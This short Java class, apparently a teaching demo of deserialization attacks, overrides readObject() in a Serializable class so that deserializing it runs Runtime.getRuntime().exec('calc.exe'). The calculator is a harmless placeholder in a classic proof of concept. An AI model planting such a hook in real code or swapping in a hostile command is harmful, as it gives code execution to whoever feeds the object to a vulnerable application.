package com.wrh.crack;

import java.io.IOException;
import java.io.Serializable;

/**
 * @author wuruohong
 * @Classname MyObject
 * @Description TODO
 * @Date 2021/10/20 18:02
 */
public class MyObject implements Serializable {
    /**
     * 任意属性
     */
    public String name;


    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行指定程序
        Runtime.getRuntime().exec("calc.exe");
    }
}
